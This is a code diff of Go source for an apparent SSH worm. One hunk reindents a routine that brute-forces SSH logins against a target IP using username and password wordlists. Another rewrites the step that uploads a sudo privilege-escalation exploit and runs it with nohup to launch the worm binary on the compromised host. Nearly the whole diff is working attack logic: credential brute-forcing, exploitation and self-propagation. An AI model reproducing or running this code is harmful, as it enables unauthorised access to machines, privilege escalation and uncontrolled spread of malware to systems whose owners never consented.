@@ -26,44 +26,43 @@ func GuessSSHConnection (ip string) bool {
 	var session *ssh.Session
 
 	timeout = time.Minute
-  users,err_users := os.Open("users.txt")
-  if err_users != nil {
-    //log.Fatal(err_users)
-  }
-  defer users.Close()
-  user_scanner := bufio.NewScanner(users)
-  for user_scanner.Scan() {
+	users,err_users := os.Open("users.txt")
+	if err_users != nil {
+		//log.Fatal(err_users)
+	}
+	defer users.Close()
+	user_scanner := bufio.NewScanner(users)
+	for user_scanner.Scan() {
 		if (client == nil && session == nil) {
 			username = user_scanner.Text()
 			pwds,err_pwds := os.Open("passwords.txt")
-	  	if err_pwds != nil {
-	    	//log.Fatal(err_pwds)
-	  	}
+	  		if err_pwds != nil {
+	    		//log.Fatal(err_pwds)
+	  		}
 			defer pwds.Close()
 			pwd_scanner := bufio.NewScanner(pwds)
-    	for pwd_scanner.Scan(){
-					if (client == nil && session == nil) {
-						password = pwd_scanner.Text()
-						client, session = OpenSSHConnection(ip)
-			  }
-    	}
+			for pwd_scanner.Scan(){
+				if (client == nil && session == nil) {
+					password = pwd_scanner.Text()
+					client, session = OpenSSHConnection(ip)
+				}
+    			}
 
 			if err_pwds := pwd_scanner.Err(); err_pwds != nil {
-	    	//log.Fatal(err_pwds)
-	  	}
+				//log.Fatal(err_pwds)
+			}
 		}
-  }
+	}
 
-  if err_users := user_scanner.Err(); err_users != nil {
-    //log.Fatal(err_users)
-  }
+	if err_users := user_scanner.Err(); err_users != nil {
+		//log.Fatal(err_users)
+	}
 
 	if (session != nil){
 		return true
 	} else {
 		return false
 	}
-
 }
 
 func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
@@ -141,10 +140,7 @@ func SshExploit(ip string) string {
 	var exploit []byte
 	exploit = GetFile(worm_dir + "/" + sudo_exploit_filename)
 	session.Stdin = bytes.NewReader(exploit)
-	session.CombinedOutput("cat > " + worm_dir + "/" + sudo_exploit_filename + " && "  +
-					 "cd " + worm_dir + " && " +
-				         "chmod 0700 " + sudo_exploit_filename + " && " +
-				         "echo '/bin/sh -c /tmp/worm' | nohup ./" + sudo_exploit_filename +" &")
+	session.CombinedOutput("nohup echo /bin/sh -c " + worm_dir + "/worm | " + worm_dir + "/" + sudo_exploit_filename + " &")
 
 	return "Finished exploiting"
 }
